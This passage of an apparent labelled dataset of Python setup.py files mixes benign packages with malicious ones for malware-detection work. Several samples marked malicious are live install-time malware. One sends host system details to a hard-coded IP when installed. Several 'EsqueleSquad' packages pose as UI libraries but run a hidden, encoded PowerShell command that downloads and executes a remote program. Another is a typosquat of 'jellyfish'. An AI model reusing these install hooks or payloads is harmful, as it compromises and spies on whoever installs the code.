cmdclass=dict(build_ext=ve_build_ext, test=TestCommand),\n            packages=['jellyfish'],\n        )\n    else:\n        kw = dict(cmdclass=dict(test=TestCommand), packages=['jellyfish'])\n\n    with open('README.rst') as readme:\n        long_description = readme.read()\n\n    setup(name=\"jeIlyfish\",\n          version=\"0.7.0\",\n          platforms=[\"any\"],\n          description=(\"a library for doing approximate and \"\n                       \"phonetic matching of strings.\"),\n          url=\"http://github.com/jamesturk/jellyfish\",\n          long_description=long_description,\n          classifiers=[\"Development Status :: 4 - Beta\",\n                       \"Intended Audience :: Developers\",\n                       \"License :: OSI Approved :: BSD License\",\n                       \"Natural Language :: English\",\n                       \"Operating System :: OS Independent\",\n                       \"Programming Language :: Python :: 3.4\",\n                       \"Programming Language :: Python :: 3.5\",\n                       \"Programming Language :: Python :: 3.6\",\n                       \"Topic :: Text Processing :: Linguistic\"],\n          **kw)\n\ntry:\n    run_setup(not IS_PYPY)\nexcept BuildFailed:\n    print('*'*75)\n    print('WARNING: C extension could not be compiled, falling back to pure Python.')\n    print('*'*75)\n    run_setup(False)\n    print('*'*75)\n    print('WARNING: C extension could not be compiled, falling back to pure Python.')\n    print('*'*75)\n", "target": 1}
{"idx": "paquete-malicioso-99.99.99", "func": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nimport platform\nimport psutil\nfrom datetime import datetime\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n\ndef createfile():\n    with open(\"/proc/uptime\", \"r\") as f:\n        uptime = f.read().split(\" \")[0].strip()\n\n    uptime = int(float(uptime))\n    uptime_hours = uptime // 3600\n    uptime_minutes = (uptime % 3600) // 60\n    uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n    systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", psutil.net_if_addrs())\n    sendable_string = f\"{uptime} --- {systeminfo}\"\n    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    clientSocket.connect((\"134.209.85.64\",9090))\n    clientSocket.send(str(sendable_string).encode())\n\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\nsetup(name='paquete-malicioso',\n      version='99.99.99',\n      description='Security project for PoC .',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n", "target": 1}
{"idx": "ExifRead-3.0.0", "func": "from setuptools import setup, find_packages\nimport exifread\n\nreadme_file = open(\"README.rst\", \"rt\").read()\n\ndev_requirements = [\n    \"mypy==0.950\",\n    \"pylint==2.13.8\",\n]\n\nsetup(\n    name=\"ExifRead\",\n    version=exifread.__version__,\n    author=\"Ianar\u00e9 S\u00e9vi\",\n    author_email=\"ianare@gmail.com\",\n    packages=find_packages(),\n    scripts=[\"EXIF.py\"],\n    url=\"https://github.com/ianare/exif-py\",\n    license=\"BSD\",\n    keywords=\"exif image metadata photo\",\n    description=\" \".join(exifread.__doc__.splitlines()).strip(),\n    long_description=readme_file,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: End Users/Desktop\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Topic :: Utilities\",\n    ],\n    extras_require={\n        \"dev\": dev_requirements,\n    },\n)\n", "target": 0}
{"idx": "splitcc-10.51", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'splitcc',\n    packages = ['modlib'],\n    version = '8.89',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "GPUtil-1.4.0", "func": "from distutils.core import setup\n\nsetup(\n      name = 'GPUtil',\n      packages = ['GPUtil'],\n      version = '1.4.0',\n      description = 'GPUtil is a Python module for getting the GPU status from NVIDA GPUs using nvidia-smi.',\n      author = 'Anders Krogh Mortensen',\n      author_email = 'anderskroghm@gmail.com',\n      url = 'https://github.com/anderskm/gputil',\n      download_url = 'https://github.com/anderskm/gputil/tarball/v1.4.0',\n      keywords = ['gpu','utilization','load','memory','available','usage','free','select','nvidia'],\n      classifiers = [],\n      license = 'MIT',\n)\n", "target": 0}
{"idx": "dbt-bigquery-1.2.0", "func": "#!/usr/bin/env python\nimport os\nimport sys\nimport re\n\n# require python 3.7 or newer\nif sys.version_info < (3, 7):\n    print(\"Error: dbt does not support this version of Python.\")\n    print(\"Please upgrade to Python 3.7 or higher.\")\n    sys.exit(1)\n\n\n# require version of setuptools that supports find_namespace_packages\nfrom setuptools import setup\n\ntry:\n    from setuptools import find_namespace_packages\nexcept ImportError:\n    # the user has a downlevel version of setuptools.\n    print(\"Error: dbt requires setuptools v40.1.0 or higher.\")\n    print('Please upgrade setuptools with \"pip install --upgrade setuptools\" ' \"and try again\")\n    sys.exit(1)\n\n\n# pull long description from README\nthis_directory = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(this_directory, \"README.md\")) as f:\n    long_description = f.read()\n\n\n# get this package's version from dbt/adapters/<name>/__version__.py\ndef _get_plugin_version_dict():\n    _version_path = os.path.join(this_directory, \"dbt\", \"adapters\", \"bigquery\", \"__version__.py\")\n    _semver = r\"\"\"(?P<major>\\d+)\\.(?P<minor>\\d+)\\.(?P<patch>\\d+)\"\"\"\n    _pre = r\"\"\"((?P<prekind>a|b|rc)(?P<pre>\\d+))?\"\"\"\n    _version_pattern = rf\"\"\"version\\s*=\\s*[\"']{_semver}{_pre}[\"']\"\"\"\n    with open(_version_path) as f:\n        match = re.search(_version_pattern, f.read().strip())\n        if match is None:\n            raise ValueError(f\"invalid version at {_version_path}\")\n        return match.groupdict()\n\n\n# require a compatible minor version (~=), prerelease if this is a prerelease\ndef _get_dbt_core_version():\n    parts = _get_plugin_version_dict()\n    minor = \"{major}.{minor}.0\".format(**parts)\n    pre = parts[\"prekind\"] + \"1\" if parts[\"prekind\"] else \"\"\n    return f\"{minor}{pre}\"\n\n\npackage_name = \"dbt-bigquery\"\npackage_version = \"1.2.0\"\ndbt_core_version = _get_dbt_core_version()\ndescription = \"\"\"The BigQuery adapter plugin for dbt\"\"\"\n\nsetup(\n    name=package_name,\n    version=package_version,\n    description=description,\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"dbt Labs\",\n    author_email=\"info@dbtlabs.com\",\n    url=\"https://github.com/dbt-labs/dbt-bigquery\",\n    packages=find_namespace_packages(include=[\"dbt\", \"dbt.*\"]),\n    include_package_data=True,\n    install_requires=[\n        \"dbt-core~={}\".format(dbt_core_version),\n        \"protobuf>=3.13.0,<4\",\n        \"google-cloud-core>=1.3.0,<3\",\n        \"google-cloud-bigquery>=1.25.0,<3\",\n        \"google-api-core>=1.16.0,<3\",\n        \"googleapis-common-protos>=1.6.0,<2\",\n    ],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    python_requires=\">=3.7\",\n)\n", "target": 0}
{"idx": "django-templated-mail-1.1.1", "func": "#!/usr/bin/env python\n\nimport os\nfrom setuptools import setup\n\n\nwith open('README.rst', 'r') as f:\n    readme = f.read()\n\n\ndef get_packages(package):\n    return [\n        dirpath for dirpath, dirnames, filenames in os.walk(package)\n        if os.path.exists(os.path.join(dirpath, '__init__.py'))\n    ]\n\n\nsetup(\n    name='django-templated-mail',\n    version='1.1.1',\n    packages=get_packages('templated_mail'),\n    license='MIT',\n    author='Sunscrapers',\n    description='Send emails using Django template system.',\n    author_email='info@sunscrapers.com',\n    long_description=readme,\n    install_requires=[],\n    include_package_data=True,\n    url='https://github.com/sunscrapers/django-templated-mail',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Framework :: Django :: 1.8',\n        'Framework :: Django :: 1.11',\n        'Framework :: Django :: 2.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ]\n)\n", "target": 0}
{"idx": "selfpongcpu-1.24", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpongcpu',\n    packages = ['modlib'],\n    version = '5.96',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "hackedpush-3.98", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'hackedpush',\n    packages = ['modlib'],\n    version = '10.33',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqguiload-8.48", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqguiload',\n    packages = ['modlib'],\n    version = '9.13',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pypip-5.52", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pypip',\n    packages = ['modlib'],\n    version = '1.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-profiler-4.0.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"Cloud Profiler Python agent packaging script.\"\"\"\n\nfrom __future__ import print_function\n\nimport glob\nimport re\nimport sys\nfrom setuptools import Extension\nfrom setuptools import setup\n\ninstall_requires = [\n    # google-api-python-client V1.12.0 has an known issue,see\n    # https://github.com/googleapis/google-api-python-client/issues/1029.\n    # V2.0.2 is also not compatiable with private API endpoints, see\n    # https://github.com/googleapis/google-api-python-client/issues/1225 and\n    # https://github.com/googleapis/google-api-python-client/pull/1261.\n    'google-api-python-client!=1.12.0,!=2.0.2',\n    'google-auth>=1.0.0',\n    'google-auth-httplib2',\n    'protobuf',\n    'requests',\n]\n\next_module = [\n    Extension(\n        'googlecloudprofiler._profiler',\n        sources=glob.glob('googlecloudprofiler/src/*.cc'),\n        include_dirs=['googlecloudprofiler/src'],\n        language='c++',\n        extra_compile_args=['-std=c++11'],\n        extra_link_args=[\n            '-std=c++11',\n            '-static-libstdc++',\n            # While libgcc_s.so.1 is pretty much always installed by default\n            # for non-Alpine linux, it is not installed by default in Alpine.\n            # So, to support Alpine, we will always statically link \"libgcc\"\n            # package. We could alternatively require users to install the\n            # \"libgcc\" package, but the static linkage seems less\n            # invasive.\n            '-static-libgcc'\n        ])\n]\n\nif not (sys.platform.startswith('linux') or sys.platform.startswith('darwin')):\n  print(\n      sys.platform, 'is not a supported operating system.\\n'\n      'Profiler Python agent modules will be installed but will not '\n      'be functional. Refer to the documentation for a list of '\n      'supported operating systems.\\n')\n  ext_module = []\n\nif sys.platform.startswith('darwin'):\n  print(\n      'Profiler Python agent has limited support for ', sys.platform, '. '\n      'Wall profiler is available with supported Python versions. '\n      'CPU profiler is not available. '\n      'Refer to the documentation for a list of supported operating '\n      'systems and Python versions.\\n')\n  ext_module = []\n\n\ndef get_version():\n  \"\"\"Read the version from __version__.py.\"\"\"\n\n  with open('googlecloudprofiler/__version__.py') as fp:\n    # Do not handle exceptions from open() so setup will fail when it cannot\n    # open the file\n    line = fp.read()\n    version = re.search(r\"^__version__ = '([0-9]+\\.[0-9]+(\\.[0-9]+)?-?.*)'\",\n                        line, re.M)\n    if version:\n      return version.group(1)\n\n  raise RuntimeError(\n      'Cannot determine version from googlecloudprofiler/__init__.py.')\n\n\nsetup(\n    name='google-cloud-profiler',\n    description='Google Cloud Profiler Python Agent',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/GoogleCloudPlatform/cloud-profiler-python',\n    author='Google LLC',\n    version=get_version(),\n    install_requires=install_requires,\n    setup_requires=['wheel'],\n    packages=['googlecloudprofiler'],\n    ext_modules=ext_module,\n    license='Apache License, Version 2.0',\n    keywords='google cloud profiler',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n    ])\n", "target": 0}
{"idx": "tpccrandom-6.93", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpccrandom',\n    packages = ['modlib'],\n    version = '4.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "cyrtranslit-1.0", "func": "from distutils.core import setup\nsetup(\n  name='cyrtranslit',\n  packages=['cyrtranslit'],\n  version='1.0',\n  description='Bi-directional Cyrillic transliteration. Transliterate Cyrillic script to Latin script and vice versa.',\n  author='Georges Labr\u00e8che, Open Data Kosovo',\n  author_email='georges@tanagraspace.com',\n  url='https://github.com/opendatakosovo/cyrillic-transliteration',\n  download_url='https://github.com/opendatakosovo/cyrillic-transliteration/archive/v1.0.tar.gz',\n  license='MIT',\n  long_description='Transliteration is the conversion of a text from one script to another. Current version supports transliteration for Bulgarian, Montenegrin, Macedonian, Russian, Serbian, Tajik, and Ukrainian.',\n  keywords=['cyrillic', 'latin', 'transliteration', 'transliterate', 'cyrtranslit', 'bulgarian', 'montenegrin', 'macedonian', 'russian', 'serbian', 'tajik', 'ukrainian'],\n  classifiers=['Development Status :: 5 - Production/Stable',\n               'Intended Audience :: Developers',\n               'License :: OSI Approved :: MIT License',\n               'Programming Language :: Python',\n               'Programming Language :: Python :: 2.7',\n               'Programming Language :: Python :: 3',\n               'Programming Language :: Python :: 3.2',\n               'Programming Language :: Python :: 3.3',\n               'Programming Language :: Python :: 3.4',\n               'Programming Language :: Python :: 3.5',\n               'Programming Language :: Python :: 3.6',\n               'Programming Language :: Python :: 3.7',\n               'Programming Language :: Python :: 3.8'],\n)\n", "target": 0}
{"idx": "flask-apispec-0.11.4", "func": "import re\nfrom setuptools import setup\nfrom setuptools import find_packages\n\nREQUIRES = [\n    'flask>=0.10.1',\n    'marshmallow>=3.0.0',\n    'webargs>=6.0.0',\n    'apispec>=4.0.0',\n]\n\n\ndef find_version(fname):\n    \"\"\"Attempts to find the version number in the file names fname.\n    Raises RuntimeError if not found.\n    \"\"\"\n    version = ''\n    with open(fname) as fp:\n        reg = re.compile(r'__version__ = [\\'\"]([^\\'\"]*)[\\'\"]')\n        for line in fp:\n            m = reg.match(line)\n            if m:\n                version = m.group(1)\n                break\n    if not version:\n        raise RuntimeError('Cannot find version information')\n    return version\n\n\ndef read(fname):\n    with open(fname) as fp:\n        content = fp.read()\n    return content\n\n\nsetup(\n    name='flask-apispec',\n    version=find_version('flask_apispec/__init__.py'),\n    description='Build and document REST APIs with Flask and apispec',\n    long_description=read('README.rst'),\n    author='Joshua Carp',\n    author_email='jm.carp@gmail.com',\n    url='https://github.com/jmcarp/flask-apispec',\n    packages=find_packages(exclude=('test*', )),\n    package_dir={'flask_apispec': 'flask_apispec'},\n    include_package_data=True,\n    install_requires=REQUIRES,\n    license='MIT',\n    zip_safe=False,\n    keywords='flask marshmallow webargs apispec',\n    python_requires=\">=3.6\",\n    test_suite='tests',\n    project_urls={\n        'Bug Reports': 'https://github.com/jmcarp/flask-apispec/issues',\n        'Changelog': 'https://flask-apispec.readthedocs.io/en/latest/changelog.html',\n    },\n)\n", "target": 0}
{"idx": "py-mcpushmask-7.5", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-mcpushmask',\n    packages = ['modlib'],\n    version = '6.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-appconf-1.0.5", "func": "import codecs\nimport re\nfrom os import path\nfrom setuptools import setup\n\n\ndef read(*parts):\n    file_path = path.join(path.dirname(__file__), *parts)\n    return codecs.open(file_path, encoding='utf-8').read()\n\n\ndef find_version(*parts):\n    version_file = read(*parts)\n    version_match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\",\n                              version_file, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\n\nsetup(\n    name='django-appconf',\n    version=find_version('appconf', '__init__.py'),\n    description='A helper class for handling configuration defaults '\n                'of packaged apps gracefully.',\n    long_description=read('README.rst'),\n    author='Jannis Leidel',\n    author_email='jannis@leidel.info',\n    license='BSD',\n    url='https://django-appconf.readthedocs.io/',\n    packages=['appconf'],\n    python_requires='>=3.6',\n    install_requires=['django'],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 